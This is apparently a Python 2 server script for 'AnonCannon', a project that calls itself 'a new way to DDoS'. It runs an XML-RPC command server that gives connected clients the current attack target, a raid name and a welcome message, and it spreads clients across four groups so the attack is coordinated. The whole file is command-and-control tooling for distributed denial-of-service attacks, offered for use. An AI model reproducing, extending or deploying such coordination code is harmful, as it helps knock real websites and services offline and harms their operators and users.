#!/usr/bin/env python
#ANON CANNON PROJECT - A NEW WAY TO DDoS
#MAIN SERVER FILE
#imports...
import sys
import urllib                                # For self interating with Webpages.
from array import *                          # Important for Coding.
import os                                    # See the comment on the line over.
import threading                             # Don't want Multitasking?
from xml.etree import ElementTree as ET      # For configuration.
from SimpleXMLRPCServer import SimpleXMLRPCServer as Server # Client communication. 
# Main operating class.
class main(object):
  #Function to detect the own IP.
  def get_own_ip(self):
    f = urllib.urlopen("http://www.whatismyip.org")
    s = f.read()
    f.close()
    return s
  # Function for the welcome header 
  def print_welcome_header(self):
    print """----------------------------------------------------
-------------AnonCannon v.0.1 BETA------------------
----------------------------------------------------
Server information:
Server ip is:""" + self.get_own_ip() + "\nServer OS is:" + sys.platform + "\nRoot user is:" + self.get_config(0) +"\nRoot Password is:" + self.get_pw()
    return ""
  #Function for getting the current control target.
  def current_attack_address(self):
    return self.get_config(3)
  #A function that gets the pw for the admin user.
  def get_pw(self):
    return self.get_config(1)
  #Function to Getting Values out of the config.xml 
  def get_config(self, number):
    tree = ET.parse('config.xml')
    root = tree.getroot()
    return root[number].text
  def start_server(self):
    srv = Server(("", int(self.get_config(2))))
    srv.register_function(self.current_attack_address)
    srv.register_function(self.welcome_message)
    srv.register_function(self.groups)
    srv.register_function(self.get_raid_name)
    print "[+] Server started."
    srv.serve_forever()
    return 0
  def welcome_message(self):
    return self.get_config(4)
  def get_raid_name(self):
    return self.get_config(5)
  def group_up(self, number):
    l33t = int(self.read_from_file("tmp/group" + str(number)))
    l33t += 1
    self.write_to_file("tmp/group" + str(number), str(l33t))
    return 0
  def groups(self):
    #This 1 is smarter then the old or?
    last_group = int(self.read_from_file("tmp/lastgroup"))
    last_group -= 1
    if(last_group == 0):
      last_group = 4
    group_number = last_group
    self.group_up(group_number)
    self.write_to_file("tmp/lastgroup", str(group_number))
#Old Algorythm. Not more in use.
#    group1 = int(self.read_from_file("tmp/group1"))
#    group2 = int(self.read_from_file("tmp/group2"))
#    group3 = int(self.read_from_file("tmp/group3"))
#    group4 = int(self.read_from_file("tmp/group4"))
#    group_number = 0
#    if(group1 < group2):
#      group_number = 1
#      w00t = int(self.read_from_file("tmp/group1"))
#      w00t += 1
#     self.write_to_file("tmp/group1 ", str(w00t))
#    elif(group2 < group3):
#      group_number = 2
#      w00t = int(self.read_from_file("tmp/group2"))
#      w00t += 1
#      self.write_to_file("tmp/group2". str(w00t))
#    elif(group3 < group4):
#      group_number = 3
#      w00t = int(self.read_from_file("tmp/group3"))
#      w00t += 1
#      self.write_to_file("tmp/group3", str(w00t))
#    elif(group4 < group3):
#      group_number = 4
#      w00t = int(self.read_from_file("tmp/group4"))
#      w00t += 1
#      self.write_to_file("tmp/group4", str(w00t))
    return str(group_number)
  def write_to_file(self, file, value):
    fd = open(file, "w")
    fd.write(value)
    fd.close
    return 0
  def read_from_file(self, file):
    fd = open(file, "r")
    value = fd.read()
    fd.close
    return value
  def startup(self):
     print "[-] Cleaning Group files."
     self.write_to_file("tmp/group1", "0")
     self.write_to_file("tmp/group2", "0")
     self.write_to_file("tmp/group3", "0")
     self.write_to_file("tmp/group4", "0")
     self.write_to_file("tmp/lastgroup", "1")
     print "[+] Groups Files clean."
#Starting interface...
start = main()
start.print_welcome_header()
start.startup()
start.start_server()
